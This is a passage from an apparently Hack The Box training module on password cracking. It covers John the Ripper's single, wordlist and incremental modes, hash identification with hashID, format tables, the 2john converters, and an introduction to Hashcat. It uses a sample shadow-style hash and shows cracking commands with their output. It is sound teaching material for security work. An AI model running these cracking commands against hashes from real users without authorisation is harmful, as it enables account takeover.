<pre><code>r0lf:<span class="hljs-variable">$6</span><span class="hljs-variable">$ues25dIanlctrWxg</span><span class="hljs-variable">$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP</span>.GI6ng<span class="hljs-regexp">/qA4oaMrgElZ1Cb9OeXO4Fvy3/</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:Rolf Sebastian:<span class="hljs-regexp">/home/</span>r0lf:<span class="hljs-regexp">/bin/</span>bash
</code></pre><p>Based on the contents of the file, it can be inferred that the victim has the username <code>r0lf</code>, the real name <code>Rolf Sebastian</code>, and the home directory <code>/home/r0lf</code>. Single crack mode will use this information to generate candidate passwords and test them against the hash. We can run the attack with the following command:</p>
<p>&#x20; Introduction to John The Ripper</p>
<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-symbol">$</span> john --single passwd

<span class="hljs-keyword">Using</span> default input encoding: UTF<span class="hljs-number">-8</span>
Loaded <span class="hljs-number">1</span> password hash (sha512crypt, crypt(<span class="hljs-number">3</span>) <span class="hljs-symbol">$</span><span class="hljs-number">6</span><span class="hljs-symbol">$</span> [SHA512 <span class="hljs-number">256</span>/<span class="hljs-number">256</span> AVX2 <span class="hljs-number">4</span>x])
Cost <span class="hljs-number">1</span> (iteration count) is <span class="hljs-number">5000</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> loaded hashes
Will run <span class="hljs-number">4</span> OpenMP threads
Press <span class="hljs-string">'q'</span> <span class="hljs-keyword">or</span> Ctrl-C to <span class="hljs-keyword">abort</span>, almost any other key <span class="hljs-keyword">for</span> status
[...SNIP...]        (r0lf)     
<span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE <span class="hljs-number">1</span>/<span class="hljs-number">3</span> (<span class="hljs-number">2025</span><span class="hljs-number">-04</span><span class="hljs-number">-10</span> <span class="hljs-number">07</span>:<span class="hljs-number">47</span>) <span class="hljs-number">12.50</span>g/s <span class="hljs-number">5400</span>p/s <span class="hljs-number">5400</span>c/s <span class="hljs-number">5400</span>C/s NAITSABESFL0R..rSebastiannaitsabeSr
Use the <span class="hljs-string">"--show"</span> <span class="hljs-keyword">option</span> to <span class="hljs-keyword">display</span> <span class="hljs-keyword">all</span> of the cracked passwords reliably
Session completed.
</code></pre>
<p>In this case, the password hash was successfully cracked.</p>
<p><strong>Wordlist mode</strong></p>
<p><code>Wordlist mode</code> is used to crack passwords with a dictionary attack, meaning it attempts all passwords in a supplied wordlist against the password hash. The basic syntax for the command is as follows:</p>
<p>&#x20; Introduction to John The Ripper</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> john --wordlist=<span class="hljs-variable">&lt;wordlist_file&gt;</span> <span class="hljs-variable">&lt;hash_file&gt;</span>
</code></pre>
<p>The wordlist file (or files) used for cracking password hashes must be in plain text format, with one word per line. Multiple wordlists can be specified by separating them with a comma. Rules, either custom or built-in, can be specified by using the <code>--rules</code> argument. These can be applied to generate candidate passwords using transformations such as appending numbers, capitalizing letters and adding special characters.</p>
<p><strong>Incremental mode</strong></p>
<p><code>Incremental mode</code> is a powerful, brute-force-style password cracking mode that generates candidate passwords based on a statistical model (<a href="https://en.wikipedia.org/wiki/Markov_chain">Markov chains</a>). It is designed to test all character combinations defined by a specific character set, prioritizing more likely passwords based on training data.</p>
<p>This mode is the most exhaustive, but also the most time-consuming. It generates password guesses dynamically and does not rely on a predefined wordlist, in contrast to wordlist mode. Unlike purely random brute-force attacks, Incremental mode uses a statistical model to make educated guesses, resulting in a significantly more efficient approach than naïve brute-force attacks.</p>
<p>The basic syntax is:</p>
<p>&#x20; Introduction to John The Ripper</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ john --incremental &lt;hash_file&gt;
</code></pre>
<p>By default, JtR uses predefined incremental modes specified in its configuration file (<code>john.conf</code>), which define character sets and password lengths. You can customize these or define your own to target passwords that use special characters or specific patterns.</p>
<p>&#x20; Introduction to John The Ripper</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ grep '<span class="hljs-comment"># Incremental modes' -A 100 /etc/john/john.conf</span>

<span class="hljs-comment"># Incremental modes</span>

<span class="hljs-comment"># This is for one-off uses (make your own custom.chr).</span>
<span class="hljs-comment"># A charset can now also be named directly from command-line, so no config</span>
<span class="hljs-comment"># entry needed: --incremental=whatever.chr</span>
[Incremental:Custom]
File = $JOHN/custom.chr
MinLen = 0

<span class="hljs-comment"># The theoretical CharCount is 211, we've got 196.</span>
[Incremental:UTF8]
File = $JOHN/utf8.chr
MinLen = 0
CharCount = 196

<span class="hljs-comment"># This is CP1252, a super-set of ISO-8859-1.</span>
<span class="hljs-comment"># The theoretical CharCount is 219, we've got 203.</span>
[Incremental:Latin1]
File = $JOHN/latin1.chr
MinLen = 0
CharCount = 203

[Incremental:ASCII]
File = $JOHN/ascii.chr
MinLen = 0
MaxLen = 13
CharCount = 95

...SNIP...
</code></pre>
<p>Note: This mode can be resource-intensive and slow, especially for long or complex passwords. Customizing the character set and length can improve performance and focus the attack.</p>
<h3 id="identifying-hash-formats">Identifying hash formats</h3>
<p>Sometimes, password hashes may appear in an unknown format, and even John the Ripper (JtR) may not be able to identify them with complete certainty. For example, consider the following hash:</p>
<pre><code><span class="hljs-number">193069</span>ceb0461e1d40d216e<span class="hljs-number">32c79c704</span>
</code></pre><p>One way to get an idea is to consult <a href="https://openwall.info/wiki/john/sample-hashes">JtR&#39;s sample hash documentation</a>, or <a href="https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats">this list by PentestMonkey</a>. Both sources list multiple example hashes as well as the corresponding JtR format. Another option is to use a tool like <a href="https://github.com/psypanda/hashID">hashID</a>, which checks supplied hashes against a built-in list to suggest potential formats. By adding the <code>-j</code> flag, hashID will, in addition to the hash format, list the corresponding JtR format:</p>
<p>&#x20; Introduction to John The Ripper</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">root</span>@htb[/htb]$ hashid -j <span class="hljs-number">193069</span>ceb0461e1d40d216e32c79c704

<span class="hljs-symbol">Analyzing</span> <span class="hljs-string">'193069ceb0461e1d40d216e32c79c704'</span>
[+] <span class="hljs-symbol">MD2</span> [<span class="hljs-symbol">JtR</span> <span class="hljs-symbol">Format</span>: md2]
[+] <span class="hljs-symbol">MD5</span> [<span class="hljs-symbol">JtR</span> <span class="hljs-symbol">Format</span>: raw-md5]
[+] <span class="hljs-symbol">MD4</span> [<span class="hljs-symbol">JtR</span> <span class="hljs-symbol">Format</span>: raw-md4]
[+] <span class="hljs-symbol">Double</span> <span class="hljs-symbol">MD5</span> 
[+] <span class="hljs-symbol">LM</span> [<span class="hljs-symbol">JtR</span> <span class="hljs-symbol">Format</span>: lm]
[+] <span class="hljs-symbol">RIPEMD</span><span class="hljs-number">-128</span> [<span class="hljs-symbol">JtR</span> <span class="hljs-symbol">Format</span>: ripemd<span class="hljs-number">-128</span>]
[+] <span class="hljs-symbol">Haval</span><span class="hljs-number">-128</span> [<span class="hljs-symbol">JtR</span> <span class="hljs-symbol">Format</span>: haval<span class="hljs-number">-128</span><span class="hljs-number">-4</span>]
[+] <span class="hljs-symbol">Tiger</span><span class="hljs-number">-128</span> 
[+] <span class="hljs-symbol">Skein</span><span class="hljs-number">-256</span>(<span class="hljs-number">128</span>) 
[+] <span class="hljs-symbol">Skein</span><span class="hljs-number">-512</span>(<span class="hljs-number">128</span>) 
[+] <span class="hljs-symbol">Lotus</span> <span class="hljs-symbol">Notes</span>/<span class="hljs-symbol">Domino</span> <span class="hljs-number">5</span> [<span class="hljs-symbol">JtR</span> <span class="hljs-symbol">Format</span>: lotus5]
[+] <span class="hljs-symbol">Skype</span> 
[+] <span class="hljs-symbol">Snefru</span><span class="hljs-number">-128</span> [<span class="hljs-symbol">JtR</span> <span class="hljs-symbol">Format</span>: snefru<span class="hljs-number">-128</span>]
[+] <span class="hljs-symbol">NTLM</span> [<span class="hljs-symbol">JtR</span> <span class="hljs-symbol">Format</span>: nt]
[+] <span class="hljs-symbol">Domain</span> <span class="hljs-symbol">Cached</span> <span class="hljs-symbol">Credentials</span> [<span class="hljs-symbol">JtR</span> <span class="hljs-symbol">Format</span>: mscach]
[+] <span class="hljs-symbol">Domain</span> <span class="hljs-symbol">Cached</span> <span class="hljs-symbol">Credentials</span> <span class="hljs-number">2</span> [<span class="hljs-symbol">JtR</span> <span class="hljs-symbol">Format</span>: mscach2]
[+] <span class="hljs-symbol">DNSSEC</span>(<span class="hljs-symbol">NSEC3</span>) 
[+] <span class="hljs-symbol">RAdmin</span> v2.x [<span class="hljs-symbol">JtR</span> <span class="hljs-symbol">Format</span>: radmin]
</code></pre>
<p>Unfortunately, in our example it is still quite unclear what format the hash is in. This will sometimes be the case, and is simply one of the &quot;problems&quot; you will encounter as a pentester. Many times, the context of where the hash came from will be enough to make an educated case on the format. In this specific example, the hash format is RIPEMD-128.</p>
<p>JtR supports hundreds of hash formats, some of which are listed in the table below. The <code>--format</code> argument can be supplied to instruct JtR which format target hashes have.</p>
<table>
<thead>
<tr>
<th><strong>Hash format</strong></th>
<th><strong>Example command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>afs</td>
<td><code>john --format=afs [...] &lt;hash_file&gt;</code></td>
<td>AFS (Andrew File System) password hashes</td>
</tr>
<tr>
<td>bfegg</td>
<td><code>john --format=bfegg [...] &lt;hash_file&gt;</code></td>
<td>bfegg hashes used in Eggdrop IRC bots</td>
</tr>
<tr>
<td>bf</td>
<td><code>john --format=bf [...] &lt;hash_file&gt;</code></td>
<td>Blowfish-based crypt(3) hashes</td>
</tr>
<tr>
<td>bsdi</td>
<td><code>john --format=bsdi [...] &lt;hash_file&gt;</code></td>
<td>BSDi crypt(3) hashes</td>
</tr>
<tr>
<td>crypt(3)</td>
<td><code>john --format=crypt [...] &lt;hash_file&gt;</code></td>
<td>Traditional Unix crypt(3) hashes</td>
</tr>
<tr>
<td>des</td>
<td><code>john --format=des [...] &lt;hash_file&gt;</code></td>
<td>Traditional DES-based crypt(3) hashes</td>
</tr>
<tr>
<td>dmd5</td>
<td><code>john --format=dmd5 [...] &lt;hash_file&gt;</code></td>
<td>DMD5 (Dragonfly BSD MD5) password hashes</td>
</tr>
<tr>
<td>dominosec</td>
<td><code>john --format=dominosec [...] &lt;hash_file&gt;</code></td>
<td>IBM Lotus Domino 6/7 password hashes</td>
</tr>
<tr>
<td>EPiServer SID hashes</td>
<td><code>john --format=episerver [...] &lt;hash_file&gt;</code></td>
<td>EPiServer SID (Security Identifier) password hashes</td>
</tr>
<tr>
<td>hdaa</td>
<td><code>john --format=hdaa [...] &lt;hash_file&gt;</code></td>
<td>hdaa password hashes used in Openwall GNU/Linux</td>
</tr>
<tr>
<td>hmac-md5</td>
<td><code>john --format=hmac-md5 [...] &lt;hash_file&gt;</code></td>
<td>hmac-md5 password hashes</td>
</tr>
<tr>
<td>hmailserver</td>
<td><code>john --format=hmailserver [...] &lt;hash_file&gt;</code></td>
<td>hmailserver password hashes</td>
</tr>
<tr>
<td>ipb2</td>
<td><code>john --format=ipb2 [...] &lt;hash_file&gt;</code></td>
<td>Invision Power Board 2 password hashes</td>
</tr>
<tr>
<td>krb4</td>
<td><code>john --format=krb4 [...] &lt;hash_file&gt;</code></td>
<td>Kerberos 4 password hashes</td>
</tr>
<tr>
<td>krb5</td>
<td><code>john --format=krb5 [...] &lt;hash_file&gt;</code></td>
<td>Kerberos 5 password hashes</td>
</tr>
<tr>
<td>LM</td>
<td><code>john --format=LM [...] &lt;hash_file&gt;</code></td>
<td>LM (Lan Manager) password hashes</td>
</tr>
<tr>
<td>lotus5</td>
<td><code>john --format=lotus5 [...] &lt;hash_file&gt;</code></td>
<td>Lotus Notes/Domino 5 password hashes</td>
</tr>
<tr>
<td>mscash</td>
<td><code>john --format=mscash [...] &lt;hash_file&gt;</code></td>
<td>MS Cache password hashes</td>
</tr>
<tr>
<td>mscash2</td>
<td><code>john --format=mscash2 [...] &lt;hash_file&gt;</code></td>
<td>MS Cache v2 password hashes</td>
</tr>
<tr>
<td>mschapv2</td>
<td><code>john --format=mschapv2 [...] &lt;hash_file&gt;</code></td>
<td>MS CHAP v2 password hashes</td>
</tr>
<tr>
<td>mskrb5</td>
<td><code>john --format=mskrb5 [...] &lt;hash_file&gt;</code></td>
<td>MS Kerberos 5 password hashes</td>
</tr>
<tr>
<td>mssql05</td>
<td><code>john --format=mssql05 [...] &lt;hash_file&gt;</code></td>
<td>MS SQL 2005 password hashes</td>
</tr>
<tr>
<td>mssql</td>
<td><code>john --format=mssql [...] &lt;hash_file&gt;</code></td>
<td>MS SQL password hashes</td>
</tr>
<tr>
<td>mysql-fast</td>
<td><code>john --format=mysql-fast [...] &lt;hash_file&gt;</code></td>
<td>MySQL fast password hashes</td>
</tr>
<tr>
<td>mysql</td>
<td><code>john --format=mysql [...] &lt;hash_file&gt;</code></td>
<td>MySQL password hashes</td>
</tr>
<tr>
<td>mysql-sha1</td>
<td><code>john --format=mysql-sha1 [...] &lt;hash_file&gt;</code></td>
<td>MySQL SHA1 password hashes</td>
</tr>
<tr>
<td>NETLM</td>
<td><code>john --format=netlm [...] &lt;hash_file&gt;</code></td>
<td>NETLM (NT LAN Manager) password hashes</td>
</tr>
<tr>
<td>NETLMv2</td>
<td><code>john --format=netlmv2 [...] &lt;hash_file&gt;</code></td>
<td>NETLMv2 (NT LAN Manager version 2) password hashes</td>
</tr>
<tr>
<td>NETNTLM</td>
<td><code>john --format=netntlm [...] &lt;hash_file&gt;</code></td>
<td>NETNTLM (NT LAN Manager) password hashes</td>
</tr>
<tr>
<td>NETNTLMv2</td>
<td><code>john --format=netntlmv2 [...] &lt;hash_file&gt;</code></td>
<td>NETNTLMv2 (NT LAN Manager version 2) password hashes</td>
</tr>
<tr>
<td>NEThalfLM</td>
<td><code>john --format=nethalflm [...] &lt;hash_file&gt;</code></td>
<td>NEThalfLM (NT LAN Manager) password hashes</td>
</tr>
<tr>
<td>md5ns</td>
<td><code>john --format=md5ns [...] &lt;hash_file&gt;</code></td>
<td>md5ns (MD5 namespace) password hashes</td>
</tr>
<tr>
<td>nsldap</td>
<td><code>john --format=nsldap [...] &lt;hash_file&gt;</code></td>
<td>nsldap (OpenLDAP SHA) password hashes</td>
</tr>
<tr>
<td>ssha</td>
<td><code>john --format=ssha [...] &lt;hash_file&gt;</code></td>
<td>ssha (Salted SHA) password hashes</td>
</tr>
<tr>
<td>NT</td>
<td><code>john --format=nt [...] &lt;hash_file&gt;</code></td>
<td>NT (Windows NT) password hashes</td>
</tr>
<tr>
<td>openssha</td>
<td><code>john --format=openssha [...] &lt;hash_file&gt;</code></td>
<td>OPENSSH private key password hashes</td>
</tr>
<tr>
<td>oracle11</td>
<td><code>john --format=oracle11 [...] &lt;hash_file&gt;</code></td>
<td>Oracle 11 password hashes</td>
</tr>
<tr>
<td>oracle</td>
<td><code>john --format=oracle [...] &lt;hash_file&gt;</code></td>
<td>Oracle password hashes</td>
</tr>
<tr>
<td>pdf</td>
<td><code>john --format=pdf [...] &lt;hash_file&gt;</code></td>
<td>PDF (Portable Document Format) password hashes</td>
</tr>
<tr>
<td>phpass-md5</td>
<td><code>john --format=phpass-md5 [...] &lt;hash_file&gt;</code></td>
<td>PHPass-MD5 (Portable PHP password hashing framework) password hashes</td>
</tr>
<tr>
<td>phps</td>
<td><code>john --format=phps [...] &lt;hash_file&gt;</code></td>
<td>PHPS password hashes</td>
</tr>
<tr>
<td>pix-md5</td>
<td><code>john --format=pix-md5 [...] &lt;hash_file&gt;</code></td>
<td>Cisco PIX MD5 password hashes</td>
</tr>
<tr>
<td>po</td>
<td><code>john --format=po [...] &lt;hash_file&gt;</code></td>
<td>Po (Sybase SQL Anywhere) password hashes</td>
</tr>
<tr>
<td>rar</td>
<td><code>john --format=rar [...] &lt;hash_file&gt;</code></td>
<td>RAR (WinRAR) password hashes</td>
</tr>
<tr>
<td>raw-md4</td>
<td><code>john --format=raw-md4 [...] &lt;hash_file&gt;</code></td>
<td>Raw MD4 password hashes</td>
</tr>
<tr>
<td>raw-md5</td>
<td><code>john --format=raw-md5 [...] &lt;hash_file&gt;</code></td>
<td>Raw MD5 password hashes</td>
</tr>
<tr>
<td>raw-md5-unicode</td>
<td><code>john --format=raw-md5-unicode [...] &lt;hash_file&gt;</code></td>
<td>Raw MD5 Unicode password hashes</td>
</tr>
<tr>
<td>raw-sha1</td>
<td><code>john --format=raw-sha1 [...] &lt;hash_file&gt;</code></td>
<td>Raw SHA1 password hashes</td>
</tr>
<tr>
<td>raw-sha224</td>
<td><code>john --format=raw-sha224 [...] &lt;hash_file&gt;</code></td>
<td>Raw SHA224 password hashes</td>
</tr>
<tr>
<td>raw-sha256</td>
<td><code>john --format=raw-sha256 [...] &lt;hash_file&gt;</code></td>
<td>Raw SHA256 password hashes</td>
</tr>
<tr>
<td>raw-sha384</td>
<td><code>john --format=raw-sha384 [...] &lt;hash_file&gt;</code></td>
<td>Raw SHA384 password hashes</td>
</tr>
<tr>
<td>raw-sha512</td>
<td><code>john --format=raw-sha512 [...] &lt;hash_file&gt;</code></td>
<td>Raw SHA512 password hashes</td>
</tr>
<tr>
<td>salted-sha</td>
<td><code>john --format=salted-sha [...] &lt;hash_file&gt;</code></td>
<td>Salted SHA password hashes</td>
</tr>
<tr>
<td>sapb</td>
<td><code>john --format=sapb [...] &lt;hash_file&gt;</code></td>
<td>SAP CODVN B (BCODE) password hashes</td>
</tr>
<tr>
<td>sapg</td>
<td><code>john --format=sapg [...] &lt;hash_file&gt;</code></td>
<td>SAP CODVN G (PASSCODE) password hashes</td>
</tr>
<tr>
<td>sha1-gen</td>
<td><code>john --format=sha1-gen [...] &lt;hash_file&gt;</code></td>
<td>Generic SHA1 password hashes</td>
</tr>
<tr>
<td>skey</td>
<td><code>john --format=skey [...] &lt;hash_file&gt;</code></td>
<td>S/Key (One-time password) hashes</td>
</tr>
<tr>
<td>ssh</td>
<td><code>john --format=ssh [...] &lt;hash_file&gt;</code></td>
<td>SSH (Secure Shell) password hashes</td>
</tr>
<tr>
<td>sybasease</td>
<td><code>john --format=sybasease [...] &lt;hash_file&gt;</code></td>
<td>Sybase ASE password hashes</td>
</tr>
<tr>
<td>xsha</td>
<td><code>john --format=xsha [...] &lt;hash_file&gt;</code></td>
<td>xsha (Extended SHA) password hashes</td>
</tr>
<tr>
<td>zip</td>
<td><code>john --format=zip [...] &lt;hash_file&gt;</code></td>
<td>ZIP (WinZip) password hashes</td>
</tr>
</tbody>
</table>
<h3 id="cracking-files">Cracking files</h3>
<p>It is also possible to crack password-protected or encrypted files with JtR. Multiple <code>&quot;2john&quot;</code> tools come with JtR that can be used to process files and produce hashes compatible with JtR. The generalized syntax for these tools is:</p>
<p>&#x20; Introduction to John The Ripper</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> <span class="hljs-variable">&lt;tool&gt;</span> <span class="hljs-variable">&lt;file_to_crack&gt;</span> &gt; file.hash
</code></pre>
<p>Some of the tools included with JtR are:</p>
<table>
<thead>
<tr>
<th><strong>Tool</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>pdf2john</code></td>
<td>Converts PDF documents for John</td>
</tr>
<tr>
<td><code>ssh2john</code></td>
<td>Converts SSH private keys for John</td>
</tr>
<tr>
<td><code>mscash2john</code></td>
<td>Converts MS Cash hashes for John</td>
</tr>
<tr>
<td><code>keychain2john</code></td>
<td>Converts OS X keychain files for John</td>
</tr>
<tr>
<td><code>rar2john</code></td>
<td>Converts RAR archives for John</td>
</tr>
<tr>
<td><code>pfx2john</code></td>
<td>Converts PKCS#12 files for John</td>
</tr>
<tr>
<td><code>truecrypt_volume2john</code></td>
<td>Converts TrueCrypt volumes for John</td>
</tr>
<tr>
<td><code>keepass2john</code></td>
<td>Converts KeePass databases for John</td>
</tr>
<tr>
<td><code>vncpcap2john</code></td>
<td>Converts VNC PCAP files for John</td>
</tr>
<tr>
<td><code>putty2john</code></td>
<td>Converts PuTTY private keys for John</td>
</tr>
<tr>
<td><code>zip2john</code></td>
<td>Converts ZIP archives for John</td>
</tr>
<tr>
<td><code>hccap2john</code></td>
<td>Converts WPA/WPA2 handshake captures for John</td>
</tr>
<tr>
<td><code>office2john</code></td>
<td>Converts MS Office documents for John</td>
</tr>
<tr>
<td><code>wpa2john</code></td>
<td>Converts WPA/WPA2 handshakes for John</td>
</tr>
<tr>
<td>...SNIP...</td>
<td>...SNIP...</td>
</tr>
</tbody>
</table>
<p>An even larger collection can be found on the <code>Pwnbox</code>:</p>
<p>&#x20; Introduction to John The Ripper</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ locate *<span class="hljs-number">2</span>john*

<span class="hljs-regexp">/usr/</span>bin/bitlocker2john
<span class="hljs-regexp">/usr/</span>bin/dmg2john
<span class="hljs-regexp">/usr/</span>bin/gpg2john
<span class="hljs-regexp">/usr/</span>bin/hccap2john
<span class="hljs-regexp">/usr/</span>bin/keepass2john
<span class="hljs-regexp">/usr/</span>bin/putty2john
<span class="hljs-regexp">/usr/</span>bin/racf2john
<span class="hljs-regexp">/usr/</span>bin/rar2john
<span class="hljs-regexp">/usr/</span>bin/uaf2john
<span class="hljs-regexp">/usr/</span>bin/vncpcap2john
<span class="hljs-regexp">/usr/</span>bin/wlanhcx2john
<span class="hljs-regexp">/usr/</span>bin/wpapcap2john
<span class="hljs-regexp">/usr/</span>bin/zip2john
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/john/</span><span class="hljs-number">1</span>password2john.py
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/john/</span><span class="hljs-number">7</span>z2john.pl
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/john/</span>DPAPImk2john.py
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/john/</span>adxcsouf2john.py
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/john/</span>aem2john.py
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/john/</span>aix2john.pl
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/john/</span>aix2john.py
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/john/</span>andotp2john.py
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/john/</span>androidbackup2john.py
...SNIP...
</code></pre>
<hr>
<h2 id="introduction-to-hashcat">Introduction to Hashcat</h2>
<p><a href="https://hashcat.net/">Hashcat</a> is a well-known password cracking tool for Linux, Windows, and macOS. From 2009 until 2015 it was proprietary software, but has since been released as open-source. Featuring fantastic GPU support, it can be used to crack a large variety of hashes. Similar to JtR, hashcat supports multiple attack (cracking) modes which can be used to efficiently attack password hashes.</p>
<p>The general syntax used to run hashcat is as follows:</p>
<p>&#x20; Introduction to Hashcat</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ hashcat -a <span class="hljs-number">0</span> -m <span class="hljs-number">0</span> &lt;hashes&gt; <span class="hljs-string">[wordlist, rule, mask, ...]</span>
</code></pre>
<p>In the command above:</p>
<ul>
<li><code>-a</code> is used to specify the <code>attack mode</code></li>
<li><code>-m</code> is used to specify the <code>hash type</code></li>
<li><code>&lt;hashes&gt;</code> is a either a hash string, or a file containing one or more password hashes of the same type</li>
<li><code>[wordlist, rule, mask, ...]</code> is a placeholder for additional arguments that depend on the attack mode</li>
</ul>
<h3 id="hash-types">Hash types</h3>
<p>Hashcat supports hundreds of different hash types, each of which is assigned a ID. A list of associated IDs can be generated by running <code>hashcat --help</code>.</p>
<p>&#x20; Introduction to Hashcat</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hashcat --help

...SNIP...

- [ Hash modes ] -

      # | <span class="hljs-type">Name</span>                                                       | <span class="hljs-type">Category</span>
  ======+============================================================+======================================
    <span class="hljs-number">900</span> | <span class="hljs-type">MD4</span>                                                        | <span class="hljs-type">Raw</span> Hash
      <span class="hljs-number">0</span> | <span class="hljs-type">MD5</span>                                                        | <span class="hljs-type">Raw</span> Hash
    <span class="hljs-number">100</span> | <span class="hljs-type">SHA1</span>                                                       | <span class="hljs-type">Raw</span> Hash
   <span class="hljs-number">1300</span> | <span class="hljs-type">SHA2</span><span class="hljs-number">-224</span>                                                   | <span class="hljs-type">Raw</span> Hash
   <span class="hljs-number">1400</span> | <span class="hljs-type">SHA2</span><span class="hljs-number">-256</span>                                                   | <span class="hljs-type">Raw</span> Hash
  <span class="hljs-number">10800</span> | <span class="hljs-type">SHA2</span><span class="hljs-number">-384</span>                                                   | <span class="hljs-type">Raw</span> Hash
   <span class="hljs-number">1700</span> | <span class="hljs-type">SHA2</span><span class="hljs-number">-512</span>                                                   | <span class="hljs-type">Raw</span> Hash
  <span class="hljs-number">17300</span> | <span class="hljs-type">SHA3</span><span class="hljs-number">-224</span>                                                   | <span class="hljs-type">Raw</span> Hash
  <span class="hljs-number">17400</span> | <span class="hljs-type">SHA3</span><span class="hljs-number">-256</span>                                                   | <span class="hljs-type">Raw</span> Hash
  <span class="hljs-number">17500</span> | <span class="hljs-type">SHA3</span><span class="hljs-number">-384</span>                                                   | <span class="hljs-type">Raw</span> Hash
  <span class="hljs-number">17600</span> | <span class="hljs-type">SHA3</span><span class="hljs-number">-512</span>                                                   | <span class="hljs-type">Raw</span> Hash
   <span class="hljs-number">6000</span> | <span class="hljs-type">RIPEMD</span><span class="hljs-number">-160</span>                                                 | <span class="hljs-type">Raw</span> Hash
    <span class="hljs-number">600</span> | <span class="hljs-type">BLAKE2b</span><span class="hljs-number">-512</span>                                                | <span class="hljs-type">Raw</span> Hash
  <span class="hljs-number">11700</span> | <span class="hljs-type">GOST</span> R <span class="hljs-number">34.11</span><span class="hljs-number">-2012</span> (Streebog) <span class="hljs-number">256</span>-bit, big-endian           | <span class="hljs-type">Raw</span> Hash
  <span class="hljs-number">11800</span> | <span class="hljs-type">GOST</span> R <span class="hljs-number">34.11</span><span class="hljs-number">-2012</span> (Streebog) <span class="hljs-number">512</span>-bit, big-endian           | <span class="hljs-type">Raw</span> Hash
   <span class="hljs-number">6900</span> | <span class="hljs-type">GOST</span> R <span class="hljs-number">34.11</span><span class="hljs-number">-94</span>                                            | <span class="hljs-type">Raw</span> Hash
  <span class="hljs-number">17010</span> | <span class="hljs-type">GPG</span> (AES<span class="hljs-number">-128</span>/AES<span class="hljs-number">-256</span> (SHA<span class="hljs-number">-1</span>($pass)))                       | <span class="hljs-type">Raw</span> Hash
   <span class="hljs-number">5100</span> | <span class="hljs-type">Half</span> MD5                                                   | <span class="hljs-type">Raw</span> Hash
  <span class="hljs-number">17700</span> | <span class="hljs-type">Keccak</span><span class="hljs-number">-224</span>                                                 | <span class="hljs-type">Raw</span> Hash
  <span class="hljs-number">17800</span> | <span class="hljs-type">Keccak</span><span class="hljs-number">-256</span>                                                 | <span class="hljs-type">Raw</span> Hash
  <span class="hljs-number">17900</span> | <span class="hljs-type">Keccak</span><span class="hljs-number">-384</span>                                                 | <span class="hljs-type">Raw</span> Hash
  <span class="hljs-number">18000</span> | <span class="hljs-type">Keccak</span><span class="hljs-number">-512</span>                                                 | <span class="hljs-type">Raw</span> Hash
   <span class="hljs-number">6100</span> | <span class="hljs-type">Whirlpool</span>                                                  | <span class="hljs-type">Raw</span> Hash
  <span class="hljs-number">10100</span> | <span class="hljs-type">SipHash</span>                                                    | <span class="hljs-type">Raw</span> Hash
     <span class="hljs-number">70</span> | <span class="hljs-type">md5</span>(utf16le($pass))                                        | <span class="hljs-type">Raw</span> Hash
    <span class="hljs-number">170</span> | <span class="hljs-type">sha1</span>(utf16le($pass))                                       | <span class="hljs-type">Raw</span> Hash
   <span class="hljs-number">1470</span> | <span class="hljs-type">sha256</span>(utf16le($pass))                                     | <span class="hljs-type">Raw</span> Hash
...SNIP...
</code></pre>
<p>The hashcat website hosts a comprehensive list of <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">example hashes</a> which can assist in manually identifying an unknown hash type and determining the corresponding Hashcat hash mode identifier.</p>
<p>Alternatively, <a href="https://github.com/psypanda/hashID">hashID</a> can be used to quickly identify the hashcat hash type by specifying the <code>-m</code> argument.</p>
<p>&#x20; Introduction to Hashcat</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">root</span>@htb[/htb]$ hashid -m <span class="hljs-string">'$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'</span>

<span class="hljs-symbol">Analyzing</span> <span class="hljs-string">'$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'</span>
[+] <span class="hljs-symbol">MD5</span> <span class="hljs-symbol">Crypt</span> [<span class="hljs-symbol">Hashcat</span> <span class="hljs-symbol">Mode</span>: <span class="hljs-number">500</span>]
[+] <span class="hljs-symbol">Cisco</span>-<span class="hljs-symbol">IOS</span>(<span class="hljs-symbol">MD5</span>) [<span class="hljs-symbol">Hashcat</span> <span class="hljs-symbol">Mode</span>: <span class="hljs-number">500</span>]
[+] <span class="hljs-symbol">FreeBSD</span> <span class="hljs-symbol">MD5</span> [<span class="hljs-symbol">Hashcat</span> <span class="hljs-symbol">Mode</span>: <span class="hljs-number">500</span>]
</code></pre>
<h3 id="attack-modes">Attack modes</h3>
<p>Hashcat has many different attack mode, including <code>dictionary</code>, <code>mask</code>, <code>combinator</code>, and <code>association</code>. In this section we will go over the first two, as they are likely the most common ones that you will need to use.</p>
<p><strong>Dictionary attack</strong></p>
